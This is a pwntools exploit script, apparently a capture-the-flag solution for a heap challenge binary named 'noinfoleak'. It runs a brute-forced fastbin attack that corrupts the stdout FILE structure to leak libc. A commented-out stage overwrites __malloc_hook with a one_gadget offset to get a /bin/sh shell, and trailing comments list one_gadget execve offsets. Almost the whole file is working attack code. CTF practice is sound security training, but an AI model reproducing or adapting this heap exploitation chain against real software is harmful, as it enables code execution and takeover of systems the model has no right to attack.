from pwn import *

local=1
pc='./noinfoleak'
remote_addr=['',0]
aslr=True
# context.log_level=True
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

ru = lambda x : p.recvuntil(x,timeout=0.5)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def add(size,content):
    sla(">","1")
    sla(">",str(size))
    sa(">",content)

def delete(index):
    sla(">","2")
    sla(">",str(index))

def edit(index,content):
    sla(">","3")
    sla(">",str(index))
    sa(">",content)

while True:
    if local==1:
        p = process(pc,aslr=aslr)
        # gdb.attach(p,'c')
    else:
        p=remote(remote_addr[0],remote_addr[1])

    sla(">","5")
    add(0x67,"A"*0x50 + p64(0) + p64(0x71)) # 0
    add(0x7f,"B"*8) # 1
    add(0x67,"C"*8) # 2

    add(0x67,"D"*8) # 3
    add(0x67,"E"*8) # 4

    delete(1)
    delete(0)
    delete(2)

    edit(2,"\x60")
    add(0x67,"A"*8) # 5
    add(0x67,p64(0) + p64(0x71)) # 6

    delete(0)
    delete(3)

    edit(3,"\x70")
    add(0x67,"H"*8) # 7
    edit(1,"\xdd\xc5")
    add(0x67,"H"*8) # 8
    try:
        add(0x67,"\x00"*(0x620 - 0x5ed) + p64(0xfbad1800) + p64(0)*3 + p64(0x601018)) # 9
    except:
        p.close()
        continue
    # sl("5")
    # libc_base = raddr() - libc.symbols['free']
    # lg("libc_base",libc_base)
    # sl("1")
    # sla(">",str(0x67))
    # sa(">","A"*8) # 10
    # add(0x67,"A"*8) # 11
    # add(0x67,"A"*8) # 12
    # delete(11)
    # delete(12)
    
    # edit(12,p64(libc_base + libc.symbols['__malloc_hook'] - 0x23))
    # add(0x67,"A"*8) # 13
    # add(0x67,"A"*(0x20 - 0x0d) + p64(libc_base + 0xf1147)) # 14
    pause()
    
    # sla(">","1")
    # sla(">",str(0x67)) # 15
    # p.interactive()
    break
    

# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
